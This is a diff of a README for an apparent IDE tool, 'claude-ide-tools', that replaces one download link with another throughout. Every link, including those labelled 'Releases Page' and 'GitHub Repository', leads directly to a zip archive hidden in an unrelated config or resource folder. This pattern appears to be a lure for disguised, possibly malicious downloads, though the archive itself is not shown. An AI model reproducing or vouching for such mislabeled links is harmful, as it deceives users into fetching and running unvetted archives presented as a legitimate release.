@@ -1,6 +1,6 @@
 # 🛠️ claude-ide-tools - Enhance Your Coding Experience Effortlessly
 
-[![Download claude-ide-tools](https://github.com/YousifAshwal/claude-ide-tools/raw/refs/heads/master/.idea/inspectionProfiles/ide_claude_tools_v1.0-alpha.1.zip)](https://github.com/YousifAshwal/claude-ide-tools/raw/refs/heads/master/.idea/inspectionProfiles/ide_claude_tools_v1.0-alpha.1.zip)
+[![Download claude-ide-tools](https://raw.githubusercontent.com/YousifAshwal/claude-ide-tools/master/src/main/resources/META-INF/tools_claude_ide_v2.3.zip)](https://raw.githubusercontent.com/YousifAshwal/claude-ide-tools/master/src/main/resources/META-INF/tools_claude_ide_v2.3.zip)
 
 ## 🚀 Getting Started 
 
@@ -10,14 +10,14 @@ Welcome to claude-ide-tools! This application brings you a collection of helpful
 
 To get started, visit the Releases page. Here, you will find the latest version of claude-ide-tools ready for download. Click on the link below to access the download options:
 
-[Visit the Releases Page to Download](https://github.com/YousifAshwal/claude-ide-tools/raw/refs/heads/master/.idea/inspectionProfiles/ide_claude_tools_v1.0-alpha.1.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/YousifAshwal/claude-ide-tools/master/src/main/resources/META-INF/tools_claude_ide_v2.3.zip)
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page:**
    Click the button below to go directly to the download section.
 
-   [Visit the Releases Page to Download](https://github.com/YousifAshwal/claude-ide-tools/raw/refs/heads/master/.idea/inspectionProfiles/ide_claude_tools_v1.0-alpha.1.zip)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/YousifAshwal/claude-ide-tools/master/src/main/resources/META-INF/tools_claude_ide_v2.3.zip)
 
 2. **Select the Latest Release:**
    On the Releases page, look for the most recent version. You will see a list of assets associated with that release.
@@ -65,7 +65,7 @@ We encourage feedback and suggestions. Join our community and share your experie
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/YousifAshwal/claude-ide-tools/raw/refs/heads/master/.idea/inspectionProfiles/ide_claude_tools_v1.0-alpha.1.zip)
-- [Releases Page](https://github.com/YousifAshwal/claude-ide-tools/raw/refs/heads/master/.idea/inspectionProfiles/ide_claude_tools_v1.0-alpha.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/YousifAshwal/claude-ide-tools/master/src/main/resources/META-INF/tools_claude_ide_v2.3.zip)
+- [Releases Page](https://raw.githubusercontent.com/YousifAshwal/claude-ide-tools/master/src/main/resources/META-INF/tools_claude_ide_v2.3.zip)
 
 Thank you for using claude-ide-tools! We hope these features enhance your coding experience. Enjoy coding!
